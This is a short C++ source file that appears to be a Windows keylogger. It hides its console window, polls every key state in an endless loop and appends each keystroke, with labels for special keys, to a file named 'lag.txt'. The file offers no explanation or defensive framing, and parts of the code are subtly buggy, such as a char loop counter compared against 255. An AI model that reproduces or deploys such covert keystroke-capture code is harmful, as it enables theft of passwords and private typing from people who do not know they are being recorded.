#include <iostream>
#include <fstream>
#include <Windows.h>

using namespace std;

int Save(int _key, char *file);


int main(){
    FreeConsole();
    char i;
    while(true){
        Sleep(10);
        for(i=8;i<=255;i++){
            //used to say that if  BUTTON HAS BEEN PRESSED
            if(GetAsyncKeyState(i) == -32767){
                Save(i,"lag.txt");
            }
        }
    }
    return 0;

}

int Save(int _key, char *file){

    cout<<_key<<endl;
    Sleep(10);
    FILE *OUTPUTF;
    OUTPUTF = fopen(file, "a+");
    //catching the other keys virtual keys
    if(_key == VK_SHIFT)
        fprintf(OUTPUTF, "%s", "[SHIFT]" );
    else if(_key == VK_BACK)
        fprintf(OUTPUTF, "%s", "[BACK]" );
    else if(_key == VK_LBUTTON)
        fprintf(OUTPUTF, "%s", "[LBOTTON]" );
    else if(_key == VK_RETURN)
        fprintf(OUTPUTF, "%s", "[RETURN]" );
    else if(_key == VK_ESCAPE)
        fprintf(OUTPUTF, "%s", "[ESCAPE]" );
    else 
        fprintf(OUTPUTF, "%s", &_key );
    

    
    fclose(OUTPUTF);
    return 0;
}

